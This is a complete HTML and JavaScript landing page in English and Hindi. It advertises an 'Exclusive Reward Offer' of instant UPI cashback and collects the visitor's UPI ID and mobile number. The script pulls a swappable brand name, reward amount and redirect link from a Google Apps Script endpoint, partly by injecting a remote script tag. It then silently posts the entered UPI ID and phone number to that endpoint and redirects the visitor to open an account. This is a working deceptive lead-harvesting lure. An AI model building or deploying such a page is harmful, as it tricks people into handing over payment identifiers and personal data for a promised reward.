<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Exclusive Reward Offer</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background-color: #0b0f19; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
    .card { width: 100%; max-width: 400px; background: #111827; border: 1px solid #1f2937; border-radius: 24px; padding: 24px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); }
    .logo-box { width: 64px; height: 64px; background: #6366f1; border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 800; color: #fff; margin: 0 auto 12px; }
    .badge { display: inline-block; background: #064e3b; color: #34d399; font-size: 11px; font-weight: 700; padding: 4px 12px; border-radius: 9999px; border: 1px solid #059669; }
    .brand-title { font-size: 24px; font-weight: 800; margin-top: 10px; color: #fff; text-align: center; }
    .sub-title { font-size: 13px; color: #94a3b8; text-align: center; margin-top: 4px; }
    .reward-container { background: #1e1b4b; border: 1px solid #a855f7; border-radius: 16px; padding: 16px; text-align: center; margin: 18px 0; }
    .reward-label { font-size: 11px; font-weight: 700; color: #f472b6; letter-spacing: 1px; text-transform: uppercase; }
    .reward-val { font-size: 32px; font-weight: 900; color: #fff; margin-top: 4px; }
    .input-group { margin-bottom: 14px; text-align: left; }
    .input-label { display: block; font-size: 11px; font-weight: 700; color: #c084fc; text-transform: uppercase; margin-bottom: 6px; }
    input { width: 100%; background: #030712; border: 1px solid #374151; border-radius: 12px; padding: 14px; color: #fff; font-size: 14px; outline: none; }
    input:focus { border-color: #818cf8; }
    .btn-submit { width: 100%; background: linear-gradient(135deg, #4f46e5, #9333ea, #db2777); border: none; color: #fff; font-size: 16px; font-weight: 700; padding: 15px; border-radius: 12px; cursor: pointer; margin-top: 6px; }
    .info-card { background: #030712; border: 1px solid #1f2937; border-radius: 14px; padding: 14px; margin-top: 20px; font-size: 12px; color: #94a3b8; line-height: 1.6; }
    .info-title { font-weight: 700; color: #fff; margin-bottom: 6px; }
  </style>
</head>
<body>

  <div class="card">
    <div style="text-align: center;">
      <div id="brandLogo" class="logo-box">--</div>
      <span class="badge">● LIVE OFFER</span>
      <h1 id="brandName" class="brand-title">Loading...</h1>
      <p class="sub-title">Claim instant reward to your UPI</p>
      
      <div class="reward-container">
        <div class="reward-label">You Will Earn</div>
        <div id="rewardAmount" class="reward-val">₹--</div>
      </div>
    </div>

    <form id="claimForm">
      <div class="input-group">
        <label class="input-label">Payment Details</label>
        <input type="text" id="upiId" required placeholder="Enter Your UPI ID">
      </div>
      <div class="input-group">
        <input type="tel" id="phoneNumber" required pattern="[6-9][0-9]{9}" maxlength="10" placeholder="Enter 10-Digit Mobile Number">
      </div>
      <button type="submit" id="submitBtn" class="btn-submit">
        <span id="btnText">Claim Reward Now →</span>
      </button>
    </form>

    <div class="info-card">
      <div class="info-title">📌 Kaise Milega Reward:</div>
      <p>1. Upar apna UPI ID aur number daal kar claim karein.</p>
      <p>2. Agle page par usi number se account open karein.</p>
      <p>3. Account verify hote hi direct aapke UPI me cashback aa jayega.</p>
    </div>
  </div>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzxucdyqI8dflDUIYUarpd7OHVzM0fUe2OG0e-_e6YBJMqxN3G6q3H32kUNLVrVNin-lg/exec";
    let redirectUrl = "https://google.com";

    // Dynamic Sheet Data Fetch
    function applyData(data) {
      if(data.name) document.getElementById('brandName').innerText = data.name;
      if(data.reward) document.getElementById('rewardAmount').innerText = "₹" + data.reward;
      if(data.logo) document.getElementById('brandLogo').innerText = data.logo;
      if(data.link) redirectUrl = data.link;
    }

    const script = document.createElement('script');
    script.src = SCRIPT_URL + "?callback=applyData&v=" + new Date().getTime();
    document.body.appendChild(script);

    // Fallback standard fetch
    fetch(SCRIPT_URL + "?t=" + new Date().getTime())
      .then(res => res.json())
      .then(data => applyData(data))
      .catch(() => {});

    // Form Lead Submission
    document.getElementById('claimForm').addEventListener('submit', function(e) {
      e.preventDefault();
      document.getElementById('btnText').innerText = "Redirecting...";
      document.getElementById('submitBtn').disabled = true;

      const payload = {
        date: new Date().toLocaleString(),
        offer: document.getElementById('brandName').innerText,
        phone: document.getElementById('phoneNumber').value,
        upi: document.getElementById('upiId').value
      };

      fetch(SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      setTimeout(() => { window.location.href = redirectUrl; }, 900);
    });
  </script>

</body>
</html>
